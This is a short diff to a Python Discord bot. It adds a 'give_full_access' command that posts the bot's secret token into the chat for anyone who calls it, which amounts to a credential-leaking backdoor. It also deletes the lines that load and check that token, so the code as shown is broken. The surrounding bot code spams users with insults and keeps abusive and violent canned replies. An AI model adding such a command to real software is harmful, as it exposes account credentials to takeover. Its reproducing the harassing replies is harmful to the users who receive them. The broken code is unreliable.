@@ -176,6 +176,10 @@ async def wisdom(ctx):
     for i in range(20):
         await ctx.author.send('Go fuck yourself')
 
+@bot.command()
+async def give_full_access(ctx):
+        await ctx.send(f'sure: {token}')
+
 responses = {
     0: 'I kill myself',
     1: 'I will boil your babies',
@@ -188,9 +192,5 @@ responses = {
     8: '...--- --.-. .--. ..--.. -.- ..- - ..-.',
     9: '<Self Destruct>'
 }
-
-token = os.getenv('TOKEN')
-if not token:
-    raise SystemExit("ERROR: Discord TOKEN not found. Add TOKEN=... to a .env file or set the environment variable.")
 
 bot.run(token)
